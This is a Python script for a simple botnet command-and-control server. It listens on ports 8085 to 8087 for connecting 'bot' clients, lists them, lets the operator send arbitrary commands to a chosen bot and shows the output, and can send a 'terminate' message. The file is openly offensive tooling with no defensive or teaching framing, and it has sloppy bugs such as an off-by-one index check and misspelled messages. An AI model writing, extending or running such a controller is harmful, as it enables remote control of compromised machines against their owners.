#!/bin/python3
import enum
import socket
from threading import Thread
import time

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

threads = []  # lists
clients = []  # lists for connected clients

def listen_for_bots(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # call this socket instance server
    sock.bind(("", port))
    sock.listen()   # start listener
    bot, bot_address = sock.accept()
    clients.append(bot)


def choose_connected_bot(message):
  while True:
    try:
       userInput = int(input(message))       
    except ValueError:
       print(f"{bcolors.FAIL}[x] Error - Not an integer number supplied! Try again.{bcolors.ENDC}")
       continue
    else:
       return userInput 
       break 


def main():

    print(f"{bcolors.HEADER}[+] Server waiting for incoming connections{bcolors.ENDC}")

    server_port = 8085

    bots = 3

    # start listening threads
    for i in range(bots):
        listeners = Thread(target=listen_for_bots, args=(i + server_port,), daemon=True)  # thread run process as daemon in background
        threads.append(listeners)
        listeners.start()   # start each thread
    
    run_cnc = True
    while run_cnc:
        if len(clients) != 0:  # check list length to determine if bot client is connect to CnC server 
            for i, c in enumerate(clients):
                print(f"{bcolors.OKGREEN}[*] \t\t", i, "\t{bcolors.ENDC}", c.getpeername())  # peer name is the bot client IP address information connected.
                
            selected_client = choose_connected_bot("[+] Select Client by index or type '99' to exit: ") # return integer number value to variable            
            if selected_client >= 0 and selected_client <= bots:

                bot = clients[selected_client]
                run_bot = True
                while run_bot:
                    msg = input(f"{bcolors.OKBLUE}[+] Enter Message to send or type 'exit' to close connection: {bcolors.ENDC}")
                    msg = msg.encode()
                    bot.send(msg)
                    status = bot.recv(1024)  # connection info from bot
                    print(f"{bcolors.OKCYAN}[D]  Output from bot client: {bcolors.ENDC}", status.decode())

                    if msg.decode() == "exit":
                        run_bot = False
                                        
                if status == "disconnected".encode():
                    bot.close()
                    clients.remove(bot)
                print("data truserinputmitted")

            elif selected_client == 99:
                print("[.] Shutting down server connections")
                run_cnc = False
                run_bot = False
                msg = "terminate"
                msg = msg.encode()
                bot.send(msg)  #  truserinputmit message to bot client
                                    
                status = bot.recv(1024)  # connection info from bot
                print(f"{bcolors.OKCYAN}[D]  Status: {bcolors.ENDC}", status)
                if status == "disconnected".encode():
                    bot.close()
                    clients.remove(bot)
                print("data truserinputmitted")

            else:
                print(f"{bcolors.FAIL}[x] Error - number enterred not in range of connected bots {bcolors.ENDC}")
        else:
            
            print("[+] No bot clients connected to CnC server")
            userinput = input("[+] Do you want to exit CnC server listener? [yes/no] ")
            if userinput == "yes":   # response message condition validate if exit cnc server
                print(f"{bcolors.HEADER}[.] Shutting down server connections{bcolors.ENDC}")
                run_cnc = False
            else:
                run_cnc = True
            
if __name__ == "__main__":

    main()

